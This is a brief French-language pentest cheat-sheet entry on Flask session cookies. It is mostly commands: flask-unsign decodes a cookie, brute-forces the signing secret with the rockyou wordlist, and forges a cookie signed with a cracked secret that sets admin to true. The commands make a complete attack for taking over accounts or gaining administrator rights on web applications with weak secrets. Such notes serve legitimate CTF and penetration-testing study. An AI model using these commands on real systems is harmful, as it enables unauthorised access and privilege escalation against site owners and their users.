# Flask

Flask est facile d'utilisation pour créer et gérer les cookies. En général la seule vraie option est de tester la solidité du secret de chiffrement. Il arrive parfois que de la sérialisation soit utilisée en plus, ouvrant la voie à d'autres attaques, mais c'est très rare.

## Secret faible 

	pip3 install flask-unsign

	flask-unsign --decode --cookie 'ey...'
	
	flask-unsign --unsign --cookie 'ey...' --no-literal-eval --wordlist rockyou.txt

	flask-unsign --sign --cookie "{'admin': 'true', 'username': 'admin'}" --secret 's3cr3t'
